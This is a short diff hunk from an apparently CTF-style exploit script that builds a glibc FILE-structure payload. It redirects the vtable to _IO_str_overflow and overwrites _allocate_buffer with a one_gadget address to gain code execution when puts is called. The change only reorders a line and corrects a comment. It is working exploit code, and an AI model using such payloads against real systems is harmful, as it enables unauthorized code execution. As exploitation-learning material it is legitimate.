@@ -430,9 +430,9 @@ pl += p64(libc.address + 0x3eb8c0)
 pl += p64(0x0)*3
 pl += p64(0x00000000ffffffff)
 pl += p64(0x0)*2
-pl += p64(io_str_overflow - 0x38) # _IO_str_overflow minus the offset to _IO_new_file_xsputn (called in puts)
 
-pl += p64(gadget) # _s.allocate_buffer (overwritten with address of one_gadget)
+pl += p64(io_str_overflow - 0x38) # _IO_str_overflow minus the offset to _IO_new_file_xsputn (called in puts)
+pl += p64(gadget) # _s._allocate_buffer (overwritten with address of one_gadget)
 
 io.sendline(pl) # send the payload
 
